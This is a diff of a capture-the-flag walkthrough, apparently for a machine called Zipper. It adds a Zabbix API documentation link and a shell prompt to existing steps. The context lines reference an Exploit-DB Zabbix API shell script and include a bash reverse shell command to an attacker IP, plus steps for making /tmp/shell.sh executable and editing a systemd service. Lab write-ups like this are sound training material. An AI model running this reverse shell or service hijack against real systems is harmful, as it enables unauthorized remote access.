@@ -59,7 +59,7 @@ So we cannot login to the GUI, however this means some other type of access is p
 
 It just so happens someone has already scripted an API shell with Python [here](https://www.exploit-db.com/exploits/39937).
 
-The issue we run into with this script is it requires the host id to be known to execute the commands on, which we currently do not have. However, we can just have the API tell us the host id by adding in this code into the script.
+The issue we run into with this script is it requires the host id to be known to execute the commands on, which we currently do not have. However, after examining the API documentation [here](https://www.zabbix.com/documentation/3.0/manual/api/reference/host/get) we can just have the API tell us the host id by adding in this code into the script.
 
 ```python
 host_get = {
@@ -359,7 +359,7 @@ bash -i >/dev/tcp/10.10.14.30/443 0<&1
 ```
 
 ```
-chmod +x /tmp/shell.sh
+zapper@zipper:/etc/systemd/system$ chmod +x /tmp/shell.sh
 ```
 
 Edit the contents of purge-backups.service.
